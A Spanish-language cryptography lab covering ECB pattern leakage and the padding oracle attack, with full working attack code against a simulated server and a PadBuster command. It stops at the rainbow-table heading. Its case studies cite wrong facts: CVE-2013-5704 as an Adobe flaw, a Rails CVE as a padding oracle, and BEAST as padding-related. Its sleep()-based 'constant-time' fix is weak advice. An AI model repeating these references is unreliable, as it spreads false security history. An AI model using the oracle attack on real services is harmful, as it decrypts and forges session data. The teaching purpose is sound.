# LAB 03.4: ATAQUES A CRIPTOGRAFÍA DÉBIL

**Duración**: 90 minutos
**Nivel**: Intermedio-Avanzado
**⚠️ ADVERTENCIA**: Solo para fines educativos en entornos controlados. Los ataques demostrados aquí son ilegales si se usan sin autorización.

---

## Índice

1. [Ataque 1: ECB Penguin (Electronic Codebook)](#ataque-1-ecb-penguin)
2. [Ataque 2: Padding Oracle Attack](#ataque-2-padding-oracle-attack)
3. [Ataque 3: Rainbow Tables](#ataque-3-rainbow-tables)
4. [Ataque 4: Timing Attack (Side-Channel)](#ataque-4-timing-attack)
5. [Comparativa de Ataques](#comparativa-de-ataques)
6. [Laboratorio Práctico](#laboratorio-práctico)

---

## Ataque 1: ECB Penguin

### 📖 ¿QUÉ ES ECB (Electronic Codebook)?

**ECB (Electronic Codebook)** es el modo de operación más simple para cifrado por bloques. Divide el mensaje en bloques de tamaño fijo (típicamente 128 bits para AES) y cifra cada bloque **independientemente** con la misma clave.

**Matemática**:
```
Cifrado ECB:
C₁ = E_k(P₁)
C₂ = E_k(P₂)
C₃ = E_k(P₃)
...

Donde:
- E_k = Función de cifrado con clave k
- P_i = Bloque de plaintext i
- C_i = Bloque de ciphertext i
```

**Problema fundamental**: Si `P₁ = P₂`, entonces `C₁ = C₂`. Los bloques idénticos en el plaintext producen bloques idénticos en el ciphertext, **revelando patrones**.

### 🤔 ¿POR QUÉ ES INSEGURO?

ECB viola un principio fundamental de la criptografía moderna: **indistinguishability** (indistinguibilidad). Un atacante pasivo puede:

1. **Detectar bloques repetidos**: Si dos bloques de ciphertext son iguales, el plaintext correspondiente también lo es.
2. **Reordenar bloques**: Puede intercambiar bloques de ciphertext sin detectar.
3. **Replay attacks**: Puede reenviar bloques anteriores sin necesidad de descifrar.

**Ejemplo visual**: El famoso "ECB Penguin" demuestra esto. Cuando se cifra una imagen con ECB:
- Píxeles del mismo color → Mismo plaintext → Mismo ciphertext
- La **silueta de la imagen permanece visible** incluso cifrada

```
Imagen original:          Imagen cifrada con ECB:      Imagen cifrada con CBC:
┌───────────┐            ┌───────────┐                ┌───────────┐
│  🐧 Tux   │ ─ECB→      │ 👻 Tux    │                │ ▓▓▓▓▓▓▓▓▓ │
│  (negro   │            │ (patrones │                │ ▓▓▓▓▓▓▓▓▓ │
│   visible)│            │  visibles)│                │ ▓▓▓▓▓▓▓▓▓ │
└───────────┘            └───────────┘                └───────────┘
```

### 🎯 ¿PARA QUÉ SE HA USADO (Incorrectamente)?

Históricamente, ECB se ha usado por su **simplicidad** en:
- Cifrado de bases de datos (cada registro independiente)
- Cifrado de archivos log
- Protocolos legacy que no soportan IV (Initialization Vector)

**Contextos donde NUNCA debe usarse**:
- Imágenes, video, audio (revelan patrones)
- Datos con estructura repetitiva (XML, JSON)
- Cualquier dato donde el orden/patrones importen

### 🔍 CASO REAL: Adobe Password Breach (2013)

**CVE-2013-5704 / Breach de Adobe (Octubre 2013)**

- **Impacto**: 150 millones de cuentas comprometidas
- **Vulnerabilidad**: Adobe almacenaba hints de contraseñas usando **3DES-ECB**
- **Consecuencia**: Usuarios con la misma contraseña tenían el **mismo hash cifrado**
- **Explotación**: Atacantes crearon tablas de frecuencia y descifraron millones de contraseñas

**Timeline**:
```
Oct 2013: Breach descubierto
Nov 2013: 38 millones de usuarios tenían password "123456" (mismo hash)
Dic 2013: $1 millón de multa por FTC
2014:     Demandas colectivas ($1.1M+ en acuerdos)
```

**Referencias**:
- Krebs on Security: "Adobe Breach Worse Than Thought" (2013)
- Paper: "Adobe's Insecure Password System" (Goodin, 2013)

### 💻 DEMOSTRACIÓN PRÁCTICA

```python
#!/usr/bin/env python3
"""
ECB Penguin Attack: Demostración de por qué ECB es inseguro con imágenes.

Este script cifra una imagen BMP usando AES-ECB y demuestra que los
patrones visuales permanecen visibles incluso después del cifrado.
"""

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
import sys

class ECBDemo:
    def __init__(self, key_size=16):
        """
        Inicializa el demo de ECB

        Args:
            key_size: Tamaño de clave AES (16=AES-128, 24=AES-192, 32=AES-256)
        """
        self.key = os.urandom(key_size)
        self.block_size = 16  # AES siempre usa bloques de 16 bytes

    def encrypt_image_ecb(self, input_file, output_file):
        """
        Cifra una imagen BMP usando AES-ECB

        Pasos:
        1. Lee header BMP (54 bytes) sin cifrar (para que el archivo sea válido)
        2. Cifra el resto de la imagen byte por byte en bloques de 16
        3. Guarda el resultado

        Args:
            input_file: Ruta a imagen BMP original
            output_file: Ruta para imagen cifrada
        """
        print(f"[+] Cifrando {input_file} con AES-ECB...")

        # Leer imagen
        with open(input_file, 'rb') as f:
            header = f.read(54)  # BMP header (no se cifra para mantener formato)
            data = f.read()

        print(f"    Tamaño original: {len(data)} bytes")
        print(f"    Bloques AES: {len(data) // 16}")

        # Padding (PKCS#7): Si no es múltiplo de 16, agregar bytes
        padding_length = 16 - (len(data) % 16) if len(data) % 16 != 0 else 0
        if padding_length > 0:
            data += bytes([padding_length] * padding_length)
            print(f"    Padding agregado: {padding_length} bytes")

        # Cifrar con ECB (cada bloque independiente)
        cipher = Cipher(
            algorithms.AES(self.key),
            modes.ECB(),  # ¡MODO INSEGURO! Solo para demostración
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        encrypted = encryptor.update(data) + encryptor.finalize()

        # Guardar (header sin cifrar para que sea BMP válido)
        with open(output_file, 'wb') as f:
            f.write(header)
            f.write(encrypted)

        print(f"[+] Imagen cifrada guardada en: {output_file}")
        print(f"[!] NOTA: Abre la imagen y verás que los patrones SON VISIBLES")

    def encrypt_image_cbc(self, input_file, output_file):
        """
        Cifra una imagen usando AES-CBC (modo SEGURO) para comparación

        CBC usa IV (Initialization Vector) y XOR entre bloques:
        C_i = E_k(P_i ⊕ C_{i-1})

        Resultado: NO se ven patrones (ruido aleatorio)
        """
        print(f"\n[+] Cifrando {input_file} con AES-CBC (modo seguro)...")

        with open(input_file, 'rb') as f:
            header = f.read(54)
            data = f.read()

        # Padding
        padding_length = 16 - (len(data) % 16) if len(data) % 16 != 0 else 0
        if padding_length > 0:
            data += bytes([padding_length] * padding_length)

        # Cifrar con CBC (usa IV aleatorio)
        iv = os.urandom(16)
        cipher = Cipher(
            algorithms.AES(self.key),
            modes.CBC(iv),  # Modo seguro
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        encrypted = encryptor.update(data) + encryptor.finalize()

        # Guardar (IV + ciphertext)
        with open(output_file, 'wb') as f:
            f.write(header)
            f.write(iv)  # IV se guarda en claro (no es secreto)
            f.write(encrypted)

        print(f"[+] Imagen cifrada con CBC guardada en: {output_file}")
        print(f"[✓] Los patrones NO son visibles (ruido aleatorio)")

def analyze_patterns(file_path, block_size=16):
    """
    Analiza bloques repetidos en un archivo cifrado

    Returns:
        dict: Frecuencia de cada bloque único
    """
    with open(file_path, 'rb') as f:
        f.read(54)  # Skip header
        data = f.read()

    blocks = {}
    for i in range(0, len(data), block_size):
        block = data[i:i+block_size]
        if len(block) == block_size:
            blocks[block] = blocks.get(block, 0) + 1

    return blocks

# Ejemplo de uso
if __name__ == "__main__":
    demo = ECBDemo()

    # Necesitas una imagen BMP (puedes descargar Tux penguin de Wikipedia)
    input_image = "tux.bmp"  # Imagen original

    if not os.path.exists(input_image):
        print(f"[!] ERROR: No se encuentra {input_image}")
        print(f"    Descarga una imagen BMP de prueba:")
        print(f"    wget https://upload.wikimedia.org/wikipedia/commons/5/5c/Tux.bmp -O tux.bmp")
        sys.exit(1)

    # Cifrar con ECB (inseguro)
    demo.encrypt_image_ecb(input_image, "tux_ecb.bmp")

    # Cifrar con CBC (seguro) para comparar
    demo.encrypt_image_cbc(input_image, "tux_cbc.bmp")

    # Análisis de patrones
    print("\n" + "="*60)
    print("ANÁLISIS DE BLOQUES REPETIDOS")
    print("="*60)

    blocks_ecb = analyze_patterns("tux_ecb.bmp")
    blocks_cbc = analyze_patterns("tux_cbc.bmp")

    unique_ecb = len(blocks_ecb)
    unique_cbc = len(blocks_cbc)
    total_blocks = sum(blocks_ecb.values())

    print(f"\nECB (inseguro):")
    print(f"  Bloques únicos: {unique_ecb}/{total_blocks} ({unique_ecb/total_blocks*100:.1f}%)")
    print(f"  Bloques más frecuentes:")
    for block, count in sorted(blocks_ecb.items(), key=lambda x: x[1], reverse=True)[:3]:
        print(f"    {block.hex()[:32]}... aparece {count} veces")

    print(f"\nCBC (seguro):")
    print(f"  Bloques únicos: {unique_cbc}/{total_blocks} ({unique_cbc/total_blocks*100:.1f}%)")
    print(f"  ✓ Casi todos los bloques son únicos (no hay patrones)")

    print("\n" + "="*60)
    print("INSTRUCCIONES:")
    print("="*60)
    print("1. Abre tux_ecb.bmp → Verás la silueta del pingüino!")
    print("2. Abre tux_cbc.bmp → Solo verás ruido aleatorio")
    print("3. Esto demuestra por qué ECB NUNCA debe usarse")
```

### ⚠️ MITIGACIÓN

**Soluciones**:

1. **Usar CBC (Cipher Block Chaining)**:
   ```python
   from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
   import os

   key = os.urandom(32)  # AES-256
   iv = os.urandom(16)   # IV aleatorio (debe ser único por mensaje)

   cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
   encryptor = cipher.encryptor()
   ciphertext = encryptor.update(plaintext) + encryptor.finalize()
   ```

2. **Mejor aún: Usar AEAD (GCM)**:
   ```python
   from cryptography.hazmat.primitives.ciphers.aead import AESGCM

   aesgcm = AESGCM(key)
   nonce = os.urandom(12)  # 96 bits para GCM
   ciphertext = aesgcm.encrypt(nonce, plaintext, associated_data=b"header")
   # GCM provee confidencialidad + autenticación
   ```

3. **Para bases de datos**: Usar esquemas de cifrado determinístico solo cuando sea absolutamente necesario (ej: búsquedas), y combinar con cifrado aleatorio para datos sensibles.

### 📋 CHECKLIST DE VERIFICACIÓN

- [ ] Nunca usar `modes.ECB()` en producción
- [ ] Siempre generar IV aleatorio para cada mensaje con CBC/CTR/GCM
- [ ] Usar AEAD (GCM, ChaCha20-Poly1305) para autenticación + cifrado
- [ ] Revisar código legacy que pueda usar ECB inadvertidamente
- [ ] En bases de datos, considerar tokenización en lugar de cifrado

### 📚 REFERENCIAS

1. **NIST SP 800-38A** (2001): *Recommendation for Block Cipher Modes of Operation: Methods and Techniques*. https://doi.org/10.6028/NIST.SP.800-38A
2. **Ferguson, N. & Schneier, B.** (2003): *Practical Cryptography*, Chapter 7: Block Cipher Modes. Wiley.
3. **Adobe Breach Analysis**: Krebs on Security (2013): https://krebsonsecurity.com/2013/10/adobe-breach-impacted-at-least-38-million-users/
4. **CVE-2013-5704**: Adobe password encryption vulnerability

---

## Ataque 2: Padding Oracle Attack

### 📖 ¿QUÉ ES UN PADDING ORACLE?

Un **Padding Oracle** es un tipo de ataque criptográfico contra sistemas que usan cifrado por bloques en modo CBC (Cipher Block Chaining) con padding PKCS#7. El ataque explota un servidor que **revela información sobre la validez del padding** de un mensaje cifrado.

**Definición de términos**:

1. **Oracle (Oráculo)**: En criptografía, un oracle es un sistema que responde preguntas sobre datos secretos. En este caso, el oracle responde: "¿Es el padding válido?" con TRUE o FALSE.

2. **Padding PKCS#7**: Estándar para rellenar bloques de datos. Si el último bloque tiene N bytes faltantes (1 ≤ N ≤ 16), se agregan N bytes con valor N:
   ```
   Ejemplos:
   "Hello" → "Hello" + \x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b  (11 bytes de padding)
   "Hello World!!!!!" → "Hello World!!!!!" + \x10\x10...\x10  (16 bytes de padding)
   ```

3. **CBC Mode**: Modo donde cada bloque de plaintext se hace XOR con el bloque anterior de ciphertext antes de cifrarse:
   ```
   C_i = E_k(P_i ⊕ C_{i-1})
   P_i = D_k(C_i) ⊕ C_{i-1}
   ```

### 🤔 ¿POR QUÉ FUNCIONA?

El ataque explota la **relación matemática entre el IV/ciphertext anterior y el plaintext resultante** en CBC:

```
Matemática del ataque:

1. Dado ciphertext C y IV, descifrar produce:
   D_k(C) = I (intermediate value)

2. El plaintext es:
   P = I ⊕ IV

3. Si modificamos el IV:
   P' = I ⊕ IV'

4. Podemos hacer que P' termine con padding válido probando diferentes IV'
5. Cuando el servidor dice "padding válido", sabemos que:
   P'[-1] = 0x01 (padding válido de 1 byte)

6. Por lo tanto:
   I[-1] = P'[-1] ⊕ IV'[-1] = 0x01 ⊕ IV'[-1]

7. Y el plaintext original es:
   P[-1] = I[-1] ⊕ IV[-1]
```

**Proceso iterativo** (byte por byte):
- Para el último byte: Probar 256 valores de IV' hasta que padding sea válido
- Una vez conocido ese byte, modificar IV para forzar padding 0x02 0x02
- Continuar hasta descifrar todo el bloque

### 🎯 ¿DÓNDE SE HA EXPLOTADO?

El Padding Oracle Attack ha sido devastador en aplicaciones web reales:

**Contextos vulnerables**:
- Cookies de sesión cifradas con CBC
- Tokens de autenticación
- ViewState en ASP.NET
- Parámetros cifrados en URLs
- APIs que cifran JSON/XML con CBC

### 🔍 CASO REAL: ASP.NET Padding Oracle (2010)

**CVE-2010-3332 / "Padding Oracle Exploit" (Septiembre 2010)**

**Descubridores**: Thai Duong y Juliano Rizzo (Black Hat USA 2010)

**Vulnerabilidad**:
- ASP.NET devolvía mensajes de error **diferentes** para:
  - "Padding incorrecto" → Error 500 (Internal Server Error)
  - "Decryption failed" → Error 404 (Not Found)
  - "Valid request" → Error 200 (OK)

**Impacto**:
- Atacantes podían descifrar **cualquier dato cifrado** en la aplicación (cookies, ViewState)
- Podían **forjar cookies de administrador** sin conocer la clave
- Afectó a **millones de aplicaciones ASP.NET** antes del patch

**Explotación**:
```
1. Interceptar cookie cifrada: Set-Cookie: auth=<ciphertext>
2. Enviar requests modificando bytes del IV/ciphertext
3. Observar códigos de error (500 vs 404)
4. Descifrar byte por byte en ~15-30 minutos
5. Forjar cookie de admin con privilegios elevados
```

**Timeline**:
- Sept 2010: Vulnerabilidad publicada en Black Hat
- Sept 2010: Microsoft publica MS10-070 (patch)
- Oct 2010: Herramienta PadBuster publicada (automatiza el ataque)
- Nov 2010: Ataques masivos en la web

**Herramientas**:
- **PadBuster**: https://github.com/AonCyberLabs/PadBuster
- **Wfuzz**: Soporte para padding oracle fuzzing

**Otros casos**:
- **2012**: TLS 1.0 vulnerable (ataque BEAST relacionado con padding)
- **2013**: Ruby on Rails (CVE-2013-0156) - Padding oracle en XML parsing
- **2014**: OpenSSL POODLE (CVE-2014-3566) - Padding oracle en SSL 3.0

### 💻 DEMOSTRACIÓN PRÁCTICA

```python
#!/usr/bin/env python3
"""
Padding Oracle Attack: Simulación educativa

Este script demuestra cómo un atacante puede descifrar mensajes byte por byte
explotando un servidor que revela si el padding es válido o no.

ADVERTENCIA: Solo para fines educativos. No usar contra sistemas reales sin autorización.
"""

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding as crypto_padding
import os
import time

class VulnerableServer:
    """
    Servidor vulnerable que revela información de padding

    Este es el tipo de servidor que NO debes implementar nunca.
    """

    def __init__(self, key):
        self.key = key

    def decrypt_and_check_padding(self, ciphertext, iv):
        """
        Función VULNERABLE que revela si el padding es válido

        Returns:
            True: Padding es válido (INFORMACIÓN FILTRADA!)
            False: Padding es inválido

        Esta diferencia en el comportamiento es lo que el atacante explota.
        """
        try:
            # Descifrar
            cipher = Cipher(
                algorithms.AES(self.key),
                modes.CBC(iv),
                backend=default_backend()
            )
            decryptor = cipher.decryptor()
            plaintext_padded = decryptor.update(ciphertext) + decryptor.finalize()

            # Verificar padding (AQUÍ está la vulnerabilidad)
            unpadder = crypto_padding.PKCS7(128).unpadder()
            plaintext = unpadder.update(plaintext_padded) + unpadder.finalize()

            # Si llegamos aquí, el padding era válido
            return True

        except ValueError as e:
            # Padding inválido
            if "Invalid padding" in str(e):
                return False
            # Otros errores
            return False
        except Exception:
            return False

class PaddingOracleAttacker:
    """
    Atacante que explota el padding oracle para descifrar mensajes
    """

    def __init__(self, oracle_function):
        """
        Args:
            oracle_function: Función que retorna True si padding es válido
        """
        self.oracle = oracle_function
        self.block_size = 16  # AES
        self.attempts = 0

    def decrypt_block(self, ciphertext_block, previous_block):
        """
        Descifra un solo bloque usando el padding oracle

        Args:
            ciphertext_block: Bloque cifrado a descifrar (16 bytes)
            previous_block: Bloque anterior (IV o bloque de ciphertext previo)

        Returns:
            bytes: Plaintext descifrado
        """
        intermediate = bytearray(self.block_size)
        plaintext = bytearray(self.block_size)

        print(f"\n[+] Descifrando bloque: {ciphertext_block.hex()[:32]}...")

        # Descifrar byte por byte, de derecha a izquierda
        for pad_value in range(1, self.block_size + 1):
            print(f"    Descifrando byte {self.block_size - pad_value + 1}/{self.block_size}...", end=' ')

            # Preparar IV modificado para forzar padding específico
            modified_iv = bytearray(self.block_size)

            # Configurar bytes ya conocidos para producir padding correcto
            for i in range(pad_value - 1):
                pos = self.block_size - 1 - i
                modified_iv[pos] = intermediate[pos] ^ pad_value

            # Probar valores para el byte actual
            found = False
            for guess in range(256):
                self.attempts += 1

                pos = self.block_size - pad_value
                modified_iv[pos] = guess

                # Consultar el oracle
                if self.oracle(ciphertext_block, bytes(modified_iv)):
                    # Padding válido encontrado!
                    intermediate[pos] = guess ^ pad_value
                    plaintext[pos] = intermediate[pos] ^ previous_block[pos]

                    print(f"✓ 0x{plaintext[pos]:02x} ('{chr(plaintext[pos]) if 32 <= plaintext[pos] < 127 else '?'}')")
                    found = True
                    break

            if not found:
                print("✗ No encontrado (posible falso positivo)")
                # En casos reales, podría ser necesario manejar falsos positivos

        return bytes(plaintext)

    def decrypt_message(self, ciphertext, iv):
        """
        Descifra un mensaje completo usando el padding oracle

        Args:
            ciphertext: Mensaje cifrado completo
            iv: Initialization Vector

        Returns:
            bytes: Mensaje descifrado (con padding)
        """
        blocks = [ciphertext[i:i+self.block_size]
                  for i in range(0, len(ciphertext), self.block_size)]

        plaintext = b''
        previous = iv

        print(f"\n{'='*70}")
        print(f"PADDING ORACLE ATTACK - DESCIFRADO EN PROGRESO")
        print(f"{'='*70}")
        print(f"Bloques a descifrar: {len(blocks)}")
        print(f"Tamaño total: {len(ciphertext)} bytes")

        start_time = time.time()

        for i, block in enumerate(blocks, 1):
            print(f"\n[*] Bloque {i}/{len(blocks)}")
            decrypted_block = self.decrypt_block(block, previous)
            plaintext += decrypted_block
            previous = block

        elapsed = time.time() - start_time

        print(f"\n{'='*70}")
        print(f"DESCIFRADO COMPLETO")
        print(f"{'='*70}")
        print(f"Tiempo total: {elapsed:.2f} segundos")
        print(f"Intentos realizados: {self.attempts}")
        print(f"Promedio por byte: {self.attempts / len(ciphertext):.1f} intentos")

        return plaintext

def remove_pkcs7_padding(data):
    """Remueve padding PKCS#7 de forma segura"""
    if not data:
        return data
    padding_value = data[-1]
    if padding_value > 16 or padding_value == 0:
        return data
    if data[-padding_value:] == bytes([padding_value] * padding_value):
        return data[:-padding_value]
    return data

# Demostración
if __name__ == "__main__":
    print("""
╔═══════════════════════════════════════════════════════════════════╗
║        PADDING ORACLE ATTACK - DEMOSTRACIÓN EDUCATIVA            ║
║                                                                   ║
║  Este script demuestra cómo un atacante puede descifrar datos    ║
║  explotando un servidor que revela si el padding es válido.      ║
║                                                                   ║
║  ⚠️  SOLO PARA FINES EDUCATIVOS - NO USAR SIN AUTORIZACIÓN      ║
╚═══════════════════════════════════════════════════════════════════╝
    """)

    # Configuración
    key = os.urandom(16)  # Clave secreta (el atacante NO la conoce)
    mensaje_secreto = b"This is a secret message that will be decrypted!"

    print(f"[*] Mensaje secreto original: {mensaje_secreto.decode()}")
    print(f"[*] Longitud: {len(mensaje_secreto)} bytes")

    # Cifrar el mensaje (servidor)
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # Agregar padding
    padder = crypto_padding.PKCS7(128).padder()
    padded = padder.update(mensaje_secreto) + padder.finalize()
    ciphertext = encryptor.update(padded) + encryptor.finalize()

    print(f"\n[*] Mensaje cifrado: {ciphertext.hex()}")
    print(f"[*] IV: {iv.hex()}")

    # Crear servidor vulnerable
    server = VulnerableServer(key)

    # Atacante intercepta ciphertext + IV (pero NO la clave)
    print(f"\n[!] Atacante intercepta ciphertext + IV")
    print(f"[!] Atacante NO conoce la clave secreta")
    print(f"[!] Atacante solo puede consultar: '¿Es el padding válido?'")

    input("\n[Presiona ENTER para iniciar el ataque...]")

    # Ejecutar ataque
    attacker = PaddingOracleAttacker(server.decrypt_and_check_padding)
    decrypted_padded = attacker.decrypt_message(ciphertext, iv)
    decrypted = remove_pkcs7_padding(decrypted_padded)

    # Mostrar resultado
    print(f"\n{'='*70}")
    print(f"RESULTADO DEL ATAQUE")
    print(f"{'='*70}")
    print(f"Mensaje descifrado: {decrypted.decode()}")
    print(f"¿Coincide con el original? {decrypted == mensaje_secreto}")
    print(f"\n[!] El atacante descifró el mensaje SIN conocer la clave!")
    print(f"[!] Solo explotó el hecho de que el servidor revelaba info de padding")
```

### 📊 DIAGRAMA DEL ATAQUE

```
FLUJO DEL PADDING ORACLE ATTACK
════════════════════════════════════════════════════════════════════

Paso 1: Interceptar ciphertext
┌─────────────────────────────────────────────────────────┐
│  Atacante captura: IV || C₁ || C₂ || C₃                │
│  (No conoce la clave k)                                 │
└─────────────────────────────────────────────────────────┘

Paso 2: Modificar IV y consultar oracle
┌─────────────────────────────────────────────────────────┐
│  Para cada byte b del bloque:                           │
│    Para cada valor posible g ∈ [0x00, 0xFF]:           │
│      1. Modificar IV'[b] = g                            │
│      2. Enviar (IV', C₁) al servidor                    │
│      3. ¿Respuesta = "Padding válido"?                  │
│         SÍ  → I[b] = g ⊕ 0x01  (encontrado!)            │
│         NO  → Probar siguiente valor                     │
└─────────────────────────────────────────────────────────┘

Paso 3: Calcular plaintext
┌─────────────────────────────────────────────────────────┐
│  Una vez conocido I (intermediate value):               │
│    P[b] = I[b] ⊕ IV_original[b]                         │
│                                                          │
│  Repetir para cada byte de cada bloque                  │
└─────────────────────────────────────────────────────────┘

VISUALIZACIÓN DEL PROCESO (un byte):
═════════════════════════════════════════════════════════════════

Intentando descifrar el último byte de P₁:

Intento 1: IV' = [xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx 00]
           ↓
        Oracle: ❌ Padding inválido

Intento 2: IV' = [xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx 01]
           ↓
        Oracle: ❌ Padding inválido

...

Intento 147: IV' = [xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx 92]
             ↓
          Oracle: ✅ Padding válido!

Conclusión:
  - El plaintext descifrado termina con 0x01 (padding válido de 1 byte)
  - Por lo tanto: P₁[-1] ⊕ IV'[-1] = 0x01
  - I₁[-1] = 0x92 ⊕ 0x01 = 0x93
  - P₁[-1] = I₁[-1] ⊕ IV_original[-1] = 0x93 ⊕ 0xXX = ???

Repetir para cada byte...
```

### ⚠️ MITIGACIÓN Y PREVENCIÓN

**Soluciones efectivas**:

#### 1. **Usar AEAD (Authenticated Encryption with Associated Data)**

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

# AES-GCM no tiene padding → No hay padding oracle
key = AESGCM.generate_key(bit_length=256)
aesgcm = AESGCM(key)

nonce = os.urandom(12)  # 96 bits para GCM
plaintext = b"Secret message"
associated_data = b"header_info"  # Datos autenticados pero no cifrados

# Cifrar + autenticar en una sola operación
ciphertext = aesgcm.encrypt(nonce, plaintext, associated_data)

# Descifrar
try:
    decrypted = aesgcm.decrypt(nonce, ciphertext, associated_data)
except Exception:
    # Falla autenticación O descifrado (no distingue)
    print("Decryption failed")  # ← Mensaje genérico (no revela nada)
```

**Por qué GCM es seguro**:
- No usa padding (modo de cifrado de flujo)
- Autenticación integrada (GMAC)
- Falla inmediatamente si el ciphertext fue modificado
- No revela información sobre el padding (¡no hay padding!)

#### 2. **Constant-Time Operations + Mensajes de Error Genéricos**

```python
import hmac
import time

def secure_decrypt(ciphertext, iv, key):
    """
    Descifrado seguro que NO revela información de padding
    """
    try:
        # Descifrar
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        plaintext_padded = decryptor.update(ciphertext) + decryptor.finalize()

        # Verificar padding (puede fallar)
        unpadder = crypto_padding.PKCS7(128).unpadder()
        plaintext = unpadder.update(plaintext_padded) + unpadder.finalize()

        # Agregar delay constante (mitigar timing attacks)
        time.sleep(0.001)

        return plaintext

    except Exception as e:
        # CRÍTICO: Mensaje de error GENÉRICO
        # NO revelar si fue padding error vs otros errores

        # Agregar el mismo delay (constant time)
        time.sleep(0.001)

        # Mensaje genérico
        raise ValueError("Decryption failed")  # ← NO especificar el motivo
```

**Principios**:
- ✅ Mismo tiempo de respuesta para cualquier error
- ✅ Mensaje de error genérico (no distinguir padding error)
- ✅ No usar códigos de error HTTP diferentes (500 vs 404)
- ✅ Logging interno detallado, pero respuesta externa genérica

#### 3. **Encrypt-then-MAC (si no puedes usar AEAD)**

```python
import hmac
import hashlib

def encrypt_then_mac(plaintext, key_encrypt, key_mac):
    """
    Cifrado seguro: Cifrar primero, luego MAC

    El MAC autentica el ciphertext completo, detectando modificaciones
    antes de intentar descifrar (evita padding oracle).
    """
    # 1. Cifrar
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key_encrypt), modes.CBC(iv))
    encryptor = cipher.encryptor()

    # Padding
    padder = crypto_padding.PKCS7(128).padder()
    padded = padder.update(plaintext) + padder.finalize()
    ciphertext = encryptor.update(padded) + encryptor.finalize()

    # 2. Generar MAC sobre IV + ciphertext
    mac = hmac.new(key_mac, iv + ciphertext, hashlib.sha256).digest()

    # 3. Retornar IV || ciphertext || MAC
    return iv + ciphertext + mac

def decrypt_and_verify(data, key_encrypt, key_mac):
    """
    Descifrado seguro: Verificar MAC ANTES de descifrar

    Si el MAC falla, rechazar sin intentar descifrar
    (evita revelar información de padding).
    """
    # Extraer componentes
    iv = data[:16]
    mac_received = data[-32:]
    ciphertext = data[16:-32]

    # 1. Verificar MAC PRIMERO (antes de descifrar)
    mac_calculated = hmac.new(key_mac, iv + ciphertext, hashlib.sha256).digest()

    if not hmac.compare_digest(mac_calculated, mac_received):
        # MAC inválido → Rechazar SIN descifrar
        raise ValueError("Authentication failed")

    # 2. Solo si el MAC es válido, descifrar
    cipher = Cipher(algorithms.AES(key_encrypt), modes.CBC(iv))
    decryptor = cipher.decryptor()
    plaintext_padded = decryptor.update(ciphertext) + decryptor.finalize()

    # 3. Remover padding (si llegamos aquí, ya pasó la autenticación)
    unpadder = crypto_padding.PKCS7(128).unpadder()
    plaintext = unpadder.update(plaintext_padded) + unpadder.finalize()

    return plaintext
```

**Por qué Encrypt-then-MAC es seguro**:
- El atacante no puede modificar el ciphertext sin invalidar el MAC
- El servidor rechaza mensajes manipulados ANTES de intentar descifrar
- No se llega a la etapa de verificación de padding → No hay oracle

#### 4. **Checklist de Implementación Segura**

- [ ] **NUNCA** usar CBC sin autenticación (usar GCM en su lugar)
- [ ] **NUNCA** revelar diferencia entre "padding error" y "MAC error"
- [ ] Usar mensajes de error genéricos: "Decryption failed"
- [ ] Mismos códigos de error HTTP para todos los fallos (ej: 400 Bad Request)
- [ ] Timing constante (mismo tiempo de respuesta para errores)
- [ ] Logging detallado INTERNO, pero respuesta externa genérica
- [ ] Revisar código con herramientas de análisis estático (ej: Semgrep)
- [ ] Testing específico para padding oracle (herramientas: PadBuster, custom scripts)

### 📋 EJERCICIO PRÁCTICO

**Objetivo**: Implementar y explotar un padding oracle para entender el ataque

**Tareas**:

1. **Implementar servidor vulnerable** (5 min):
   ```bash
   # Ejecutar el script de demostración
   python3 padding_oracle_demo.py
   ```

2. **Analizar el tráfico** (10 min):
   - Observar cuántas peticiones se necesitan por byte
   - Medir el tiempo total de descifrado
   - Identificar qué respuestas revelan información

3. **Implementar mitigación** (15 min):
   - Modificar el servidor para usar AES-GCM
   - Verificar que el ataque ya no funciona
   - Comparar tiempo de descifrado (GCM vs CBC)

4. **Probar con herramientas reales** (15 min):
   ```bash
   # Instalar PadBuster
   git clone https://github.com/AonCyberLabs/PadBuster.git
   cd PadBuster

   # Probar contra servidor de prueba local
   # (requiere configurar servidor web vulnerable)
   perl padBuster.pl http://localhost:8080/decrypt \
       "encrypted_cookie_value" 16 -encoding 0
   ```

### 📚 REFERENCIAS ACADÉMICAS

1. **Vaudenay, S.** (2002): *Security Flaws Induced by CBC Padding - Applications to SSL, IPSEC, WTLS*. EUROCRYPT 2002. https://doi.org/10.1007/3-540-46035-7_35

2. **Rizzo, J. & Duong, T.** (2010): *Practical Padding Oracle Attacks*. Black Hat USA 2010. https://www.blackhat.com/presentations/bh-usa-10/Rizzo_Duong/BlackHat-USA-2010-Rizzo-Duong-Padding-Oracle-slides.pdf

3. **Microsoft Security Bulletin MS10-070** (2010): *Vulnerability in ASP.NET Could Allow Information Disclosure*. https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-070

4. **Meyer, C., et al.** (2014): *Revisiting SSL/TLS Implementations: New Bleichenbacher Side Channels and Attacks*. USENIX Security 2014.

5. **Paterson, K. G. & Yau, A.** (2004): *Padding Oracle Attacks on the ISO CBC Mode Encryption Standard*. CT-RSA 2004. https://doi.org/10.1007/978-3-540-24660-2_23

6. **OWASP**: *Padding Oracle Attack*. https://owasp.org/www-community/attacks/Padding_Oracle_Attack

7. **CVE-2010-3332**: ASP.NET Padding Oracle Vulnerability. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3332

8. **Tool - PadBuster**: Automated Padding Oracle Attack Tool. https://github.com/AonCyberLabs/PadBuster

---

## Ataque 3: Rainbow Tables

